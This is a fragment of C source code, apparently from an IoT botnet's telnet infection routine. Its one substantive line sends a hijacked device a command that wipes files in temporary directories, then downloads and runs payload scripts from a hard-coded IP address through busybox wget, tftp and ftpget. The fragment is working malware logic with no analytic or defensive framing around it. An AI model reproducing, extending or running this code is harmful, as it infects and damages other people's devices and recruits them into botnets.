			...
			case 8:
				{
					...
					if(send(fds[i].fd, "cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://5.154.190.123/bin.sh;sh bin.sh;busybox tftp -r bin2.sh -g 5.154.190.123;sh bin2.sh;busybox tftp -c 5.154.190.123 get bin3.sh;sh bin3.sh;busybox ftpget 5.154.190.123 bin4;sh bin4.sh;exit\r\n", 275, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; memset(fds[i].sockbuf, 0, 1024); continue; }
